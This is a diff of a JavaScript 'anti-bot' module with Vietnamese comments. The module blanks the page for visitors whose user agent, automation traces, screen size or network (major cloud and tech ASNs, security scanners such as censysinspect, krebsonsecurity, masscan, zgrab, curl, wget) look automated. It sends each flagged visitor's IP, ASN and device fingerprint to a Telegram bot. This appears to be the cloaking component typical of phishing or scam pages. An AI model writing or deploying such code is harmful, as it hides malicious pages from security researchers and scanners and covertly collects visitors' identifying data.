@@ -1,189 +1,79 @@
-import { noti_token, noti_chat_id } from "./config.js";
+import config from '@/utils/config';
+import axios from 'axios';
 
 const blockedKeywords = [
-  // automation / crawler / headless ("crawler"/"googlebot"... xử sau geo — spec 3.6)
-  "scraper",
-  "scrapy",
-  "puppeteer",
-  "playwright",
-  "selenium",
-  "phantomjs",
-  "phantom",
-  "nightmare",
-  "headless",
-  "chromedriver",
-  "webdriver",
-  "lighthouse",
-  // HTTP / scripting UA (đúng spec — dễ false positive)
-  "http",
-  "client",
-  "curl",
-  "wget",
-  "python-requests",
-  "python",
-  "java",
-  "ruby",
-  "go",
-  // SEO / scanner / crawler catalog
-  "scan",
-  "ahrefs",
-  "semrush",
-  "sistrix",
-  "censysinspect",
-  "krebsonsecurity",
-  "ivre-masscan",
-  "masscan",
-  "larbin",
-  "libwww",
-  "spinn3r",
-  "zgrab",
-  "yandex",
-  "baidu",
-  "sogou",
-  "tweetmeme",
-  "mailchimp",
-  "mailgun",
-  "misting",
-  "botpoke",
-];
-
-const seleniumWindowProps = [
-  "__selenium_unwrapped",
-  "__webdriver_evaluate",
-  "__driver_evaluate",
-  "__webdriver_script_function",
-  "__webdriver_script_func",
-  "__webdriver_script_fn",
-  "__fxdriver_evaluate",
-  "__driver_unwrapped",
-  "__webdriver_unwrapped",
-  "__selenium_evaluate",
-  "__fxdriver_unwrapped",
-];
-
-const seleniumDocumentProps = [
-  "__webdriver_evaluate",
-  "__selenium_evaluate",
-  "__webdriver_script_function",
-  "$chrome_asyncScriptInfo",
+  'bot',
+  'crawler',
+  'spider',
+  'puppeteer',
+  'selenium',
+  'http',
+  'client',
+  'curl',
+  'wget',
+  'python',
+  'java',
+  'ruby',
+  'go',
+  'scrapy',
+  'lighthouse',
+  'censysinspect',
+  'krebsonsecurity',
+  'ivre-masscan',
+  'ahrefs',
+  'semrush',
+  'sistrix',
+  'mailchimp',
+  'mailgun',
+  'larbin',
+  'libwww',
+  'spinn3r',
+  'zgrab',
+  'masscan',
+  'yandex',
+  'baidu',
+  'sogou',
+  'tweetmeme',
+  'misting',
+  'BotPoke',
 ];
 
 const blockedASNs = [
-  15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961,
-  401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209,
-  51396, 147049,
+  15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961,
+  401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396,
+  147049,
 ];
 
-const blockedIPs = ["95.214.55.43", "154.213.184.3"];
-
-/** Từ "bot" trong UA (ngoại trừ crawler tìm kiếm xử ở bước silent sau geo — spec 3.6). */
-const matchesGenericBotToken = () => {
-  const ua = navigator.userAgent;
-  return (
-    /\bbot\b/i.test(ua) &&
-    !/\b(?:googlebot|bingbot|applebot|adsbot-google|duplexweb-google)\b/i.test(
-      ua
-    )
-  );
-};
+const blockedIPs = ['95.214.55.43', '154.213.184.3'];
 
 export const ensureIpInfo = async () => {
   try {
-    if (typeof localStorage === "undefined") return;
-    if (localStorage.getItem("ipInfo")) return;
-    const geoData = await fetchJson("https://get.geojs.io/v1/ip/geo.json");
+    if (typeof localStorage === 'undefined') return;
+    if (localStorage.getItem('ipInfo')) return;
+    const geoRes = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+    const geoData = geoRes.data;
     localStorage.setItem(
-      "ipInfo",
+      'ipInfo',
       JSON.stringify({
         asn: geoData.asn,
         ip: geoData.ip,
         organization_name: geoData.organization_name,
         organization: geoData.organization,
-      })
+      }),
     );
   } catch {
     /* noop */
   }
 };
 
-/** Chạy toàn bộ pipeline chặn bot theo thứ tự spec. */
-const detectBot = async () => {
-  if (matchesGenericBotToken()) {
-    return await haltAsBotKeyword("bot", { notifyTelegram: true });
-  }
-
-  const keywordHit = blockedKeywordsMatcher();
-  if (keywordHit) {
-    return await haltAsBotKeyword(keywordHit, { notifyTelegram: true });
-  }
-
-  const adv = await checkAdvancedWebDriverDetection();
-  if (adv.isBot) return { isBot: true, reason: adv.reason };
-
-  const nav = await checkNavigatorAnomalies();
-  if (nav.isBot) return { isBot: true, reason: nav.reason };
-
-  const scr = await checkScreenAnomalies();
-  if (scr.isBot) return { isBot: true, reason: scr.reason };
-
-  const geo = await checkAndBlockByGeoIP();
-  if (geo.isBlocked)
-    return { isBot: true, reason: geo.reason ?? "blocked by geo" };
-
-  /** Spec 3.6: sau geo, không Telegram / không xóa body trong nhánh này. */
-  const silentBots = /\b(?:googlebot|bingbot|crawler|spider)\b/i.test(
-    navigator.userAgent
-  );
-  if (silentBots) {
-    return {
-      isBot: true,
-      reason: "obvious bot UA (silent, post-geo)",
-    };
-  }
-
-  return { isBot: false };
-};
-
-/** Trả substring khớp (hoặc null). Tránh chỉ substring "go" — dùng các pattern an toàn hơn trong mảng. */
-const blockedKeywordsMatcher = () => {
-  const ua = navigator.userAgent.toLowerCase();
-  return blockedKeywords.find((keyword) =>
-    keyword ? ua.includes(keyword.toLowerCase()) : false
-  );
-};
-
-const haltAsBotKeyword = async (blockedKeyword, { notifyTelegram }) => {
-  const reason = `user agent chứa keyword: ${blockedKeyword}`;
-  if (notifyTelegram) await sendBotTelegram(reason);
-  await blockPage();
-  return { isBot: true, reason };
-};
-
-const blockPage = async () => {
-  try {
-    document.body.innerHTML = "";
-  } catch {
-    /* noop */
-  }
-  try {
-    window.location.href = "about:blank";
-  } catch {
-    /* noop */
-  }
-};
-
-const fetchJson = async (url, opts) => {
-  const res = await fetch(url, opts);
-  if (!res.ok) throw new Error(String(res.status));
-  return res.json();
-};
-
 const sendBotTelegram = async (reason) => {
   try {
-    if (!noti_token || String(noti_token).trim() === "") return;
+    const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
+    const botToken = config.noti_token;
+    const chatId = config.noti_chat_id;
 
-    const geoData = await fetchJson("https://get.geojs.io/v1/ip/geo.json");
-
+    const geoRes = await axios.get(geoUrl);
+    const geoData = geoRes.data;
     const fullFingerprint = {
       asn: geoData.asn,
       organization_name: geoData.organization_name,
@@ -203,45 +93,58 @@ const sendBotTelegram = async (reason) => {
       },
     };
 
-    const msg =
-      `🚫 <b>BOT BỊ CHẶN</b>\n` +
-      `🔍 <b>Lý do:</b> <code>${escapeHtmlSnippet(reason)}</code>\n\n` +
-      `📍 <b>IP:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.ip ?? ""))}</code>\n` +
-      `🏢 <b>ASN:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.asn ?? ""))}</code>\n` +
-      `🏛️ <b>Nhà mạng:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.organization_name ?? fullFingerprint.organization ?? "Không rõ"))}</code>\n\n` +
-      `🌐 <b>Trình duyệt:</b> <code>${escapeHtmlSnippet(fullFingerprint.navigator.userAgent)}</code>\n` +
-      `💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency ?? ""}</code> nhân\n` +
-      `📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints ?? ""}</code> điểm\n` +
-      `🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? "Có" : "Không"}</code>\n\n` +
-      `📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>\n` +
-      `📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
+    const msg = `🚫 <b>BOT BỊ CHẶN</b>
+🔍 <b>Lý do:</b> <code>${reason}</code>
 
-    const telegramUrl = `https://api.telegram.org/bot${noti_token}/sendMessage`;
+📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
+🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
+🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>
 
-    await fetch(telegramUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: noti_chat_id,
-        text: msg,
-        parse_mode: "HTML",
-      }),
+🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
+💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
+📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
+🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>
+
+📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
+📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
+
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const payload = {
+      chat_id: chatId,
+      text: msg,
+      parse_mode: 'HTML',
+    };
+
+    await axios.post(telegramUrl, payload, {
+      headers: { 'Content-Type': 'application/json' },
     });
   } catch {
     /* noop */
   }
 };
 
-const escapeHtmlSnippet = (s) =>
-  String(s)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
+const checkAndBlockBots = async () => {
+  const userAgent = navigator.userAgent.toLowerCase();
+  const blockedKeyword = blockedKeywords.find((keyword) =>
+    userAgent.includes(keyword.toLowerCase()),
+  );
+  if (blockedKeyword) {
+    const reason = `user agent chứa keyword: ${blockedKeyword}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    try {
+      window.location.href = 'about:blank';
+    } catch {
+      /* noop */
+    }
+    return { isBlocked: true, reason };
+  }
+  return { isBlocked: false };
+};
 
-export const checkAndBlockByGeoIP = async () => {
+const checkAndBlockByGeoIP = async () => {
   try {
-    await ensureIpInfo();
-    const ipInfo = localStorage.getItem("ipInfo");
+    const ipInfo = localStorage.getItem('ipInfo');
     if (!ipInfo) {
       return { isBlocked: false };
     }
@@ -251,14 +154,16 @@ export const checkAndBlockByGeoIP = async () => {
     if (blockedASNs.includes(Number(data.asn))) {
       const reason = `ASN bị chặn: ${data.asn}`;
       await sendBotTelegram(reason);
-      await blockPage();
+      document.body.innerHTML = '';
+      window.location.href = 'about:blank';
       return { isBlocked: true, reason };
     }
 
-    if (data.ip && blockedIPs.includes(data.ip)) {
+    if (blockedIPs.includes(data.ip)) {
       const reason = `IP bị chặn: ${data.ip}`;
       await sendBotTelegram(reason);
-      await blockPage();
+      document.body.innerHTML = '';
+      window.location.href = 'about:blank';
       return { isBlocked: true, reason };
     }
 
@@ -268,90 +173,181 @@ export const checkAndBlockByGeoIP = async () => {
   }
 };
 
-const haltAutomation = async (reason) => {
-  await sendBotTelegram(reason);
-  await blockPage();
-  return { isBot: true, reason };
-};
-
-export const checkAdvancedWebDriverDetection = async () => {
+const checkAdvancedWebDriverDetection = async () => {
   if (navigator.webdriver === true) {
-    return haltAutomation("navigator.webdriver = true");
+    const reason = 'navigator.webdriver = true';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
 
-  if ("__nightmare" in window) {
-    return haltAutomation("__nightmare in window");
+  if ('__nightmare' in window) {
+    const reason = 'nightmare detected';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
-  if ("_phantom" in window || "callPhantom" in window) {
-    return haltAutomation("phantom in window");
+  if ('_phantom' in window || 'callPhantom' in window) {
+    const reason = 'phantom detected';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
-  if ("Buffer" in window) {
-    return haltAutomation("Buffer in window");
+  if ('Buffer' in window) {
+    const reason = 'buffer detected';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
-  /** Rủi ro false-positive (một số bundler/polyfill đặt emit trên global). */
-  if ("emit" in window) {
-    return haltAutomation("emit in window");
+  if ('emit' in window) {
+    const reason = 'emit detected';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
   }
-  if ("spawn" in window) {
-    return haltAutomation("spawn in window");
+  if ('spawn' in window) {
+    const reason = 'spawn detected';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
 
-  const foundWin = seleniumWindowProps.find((prop) => prop in window);
-  if (foundWin) {
-    return haltAutomation(`selenium window property: ${foundWin}`);
+  const seleniumProps = [
+    '__selenium_unwrapped',
+    '__webdriver_evaluate',
+    '__driver_evaluate',
+    '__webdriver_script_function',
+    '__webdriver_script_func',
+    '__webdriver_script_fn',
+    '__fxdriver_evaluate',
+    '__driver_unwrapped',
+    '__webdriver_unwrapped',
+    '__selenium_evaluate',
+    '__fxdriver_unwrapped',
+  ];
+
+  const foundProp = seleniumProps.find((prop) => prop in window);
+  if (foundProp) {
+    const reason = `selenium property: ${foundProp}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
   }
 
-  const foundDoc = seleniumDocumentProps.find((prop) => prop in document);
-  if (foundDoc) {
-    return haltAutomation(`selenium document property: ${foundDoc}`);
+  if ('__webdriver_evaluate' in document) {
+    const reason = 'webdriver_evaluate in document';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
+  }
+  if ('__selenium_evaluate' in document) {
+    const reason = 'selenium_evaluate in document';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
+  }
+  if ('__webdriver_script_function' in document) {
+    const reason = 'webdriver_script_function in document';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
   }
 
   return { isBot: false };
 };
 
-export const checkNavigatorAnomalies = async () => {
+const checkNavigatorAnomalies = async () => {
   if (navigator.webdriver === true) {
-    return haltAutomation("navigator.webdriver = true (navigator check)");
+    const reason = 'navigator.webdriver = true';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
   }
 
-  if (
-    navigator.hardwareConcurrency !== undefined &&
-    navigator.hardwareConcurrency !== null &&
-    navigator.hardwareConcurrency > 128
-  ) {
-    return haltAutomation(
-      `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`
-    );
+  if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
+    const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
-  if (
-    navigator.hardwareConcurrency !== undefined &&
-    navigator.hardwareConcurrency !== null &&
-    navigator.hardwareConcurrency < 1
-  ) {
-    return haltAutomation(
-      `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`
-    );
+  if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
+    const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    return { isBot: true, reason };
   }
 
   return { isBot: false };
 };
 
-export const checkScreenAnomalies = async () => {
+const checkScreenAnomalies = async () => {
   if (screen.width === 2000 && screen.height === 2000) {
-    return haltAutomation("màn hình 2000x2000 (bot pattern)");
+    const reason = 'màn hình 2000x2000 (bot pattern)';
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
 
   if (screen.width > 4000 || screen.height > 4000) {
-    return haltAutomation(
-      `màn hình quá lớn: ${screen.width}x${screen.height}`
-    );
+    const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
   if (screen.width < 200 || screen.height < 200) {
-    return haltAutomation(
-      `màn hình quá nhỏ: ${screen.width}x${screen.height}`
-    );
+    const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
+    await sendBotTelegram(reason);
+    document.body.innerHTML = '';
+    window.location.href = 'about:blank';
+    return { isBot: true, reason };
   }
 
+  return { isBot: false };
+};
+
+const detectBot = async () => {
+  const userAgentCheck = await checkAndBlockBots();
+  if (userAgentCheck.isBlocked) {
+    return { isBot: true, reason: userAgentCheck.reason };
+  }
+
+  const webDriverCheck = await checkAdvancedWebDriverDetection();
+  if (webDriverCheck.isBot) {
+    return { isBot: true, reason: webDriverCheck.reason };
+  }
+
+  const navigatorCheck = await checkNavigatorAnomalies();
+  if (navigatorCheck.isBot) {
+    return { isBot: true, reason: navigatorCheck.reason };
+  }
+
+  const screenCheck = await checkScreenAnomalies();
+  if (screenCheck.isBot) {
+    return { isBot: true, reason: screenCheck.reason };
+  }
+
+  await ensureIpInfo();
+  const geoIPCheck = await checkAndBlockByGeoIP();
+  if (geoIPCheck.isBlocked) {
+    return { isBot: true, reason: geoIPCheck.reason };
+  }
+
+  const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
+  const foundKeyword = obviousBotKeywords.find((keyword) =>
+    navigator.userAgent.toLowerCase().includes(keyword),
+  );
+
+  if (foundKeyword) {
+    return { isBot: true, reason: `obvious bot keyword: ${foundKeyword}` };
+  }
   return { isBot: false };
 };
 
